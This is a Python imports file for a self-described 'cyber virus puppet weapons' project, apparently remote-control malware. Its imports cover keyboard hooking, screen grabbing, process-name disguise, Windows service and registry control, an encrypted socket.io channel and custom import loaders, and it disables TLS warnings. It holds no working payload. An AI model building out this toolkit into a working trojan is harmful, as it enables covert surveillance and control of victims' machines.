# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLib/T_imports
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# This document contains all the third-party libraries required for this project,
# Using from... import ... Minimize the footprint and define the library namespace using class.
# This file should be as small as possible to reduce the size of the compilation.


# pip install psutil pywin32 python-socketio requests websocket-client pyinstaller pillow pynput playsound3 cryptography setproctitle colorama nuitka pyautogui ttkbootstrap msgpack pyasynchat
# Libraries

# MINE CLASSES
class X_ctypes:
    from _ctypes import FreeLibrary

# Win32API
import win32serviceutil
import win32security
import ntsecuritycon
import pywintypes
import win32process
import win32event
import win32file
import win32gui
import win32api
import win32con
import win32job
import win32ui
import winreg
import signal

# Win32API.Ctypes
import ctypes.wintypes
import ctypes

# Network
import socketio
import requests
import urllib3
import ftplib
import socket
import ssl

# Typing
import dataclasses
import typing
import types

# Process
import multiprocessing as mp
import multiprocessing
import setproctitle
import subprocess
import threading
import psutil
import queue

# String
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import hashlib
import base64
import string
import struct
import shlex
import io

# Python's
import ast
import configparser
import traceback
import inspect
import atexit
import pickle
import copy
import json
import uuid

# Time
from datetime import datetime
import time

# Math
import statistics
import random
import cmath
import math
import re

# Terminal
import colorama
import logging

# System
import platform
import pathlib
import pynput
import sys
import os

# UI
import tkinter
import tkinter.font
import tkinter.messagebox
import ttkbootstrap
import pyautogui
import playsound3 as playsound

# Images
from PIL import Image, ImageTk, ImageDraw, ImageFont, ImageGrab

class importlib:
    class abc: from importlib.abc import Loader, MetaPathFinder
    class util: from importlib.util import spec_from_loader


def GUUID(): return str(uuid.uuid3(uuid.NAMESPACE_DNS, str(random.randint(0, 10000000000000000000))))
def GMAC(): return '-'.join([uuid.uuid1().hex[-12:].upper()[i:i+2] for i in range(0, 11, 2)])

def asyncs(f):
    def wrapper(*args, **kwargs):
        thr = threading.Thread(target = f, args = args, kwargs = kwargs)
        thr.start()
    return wrapper

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if typing.TYPE_CHECKING:
    import Termination4
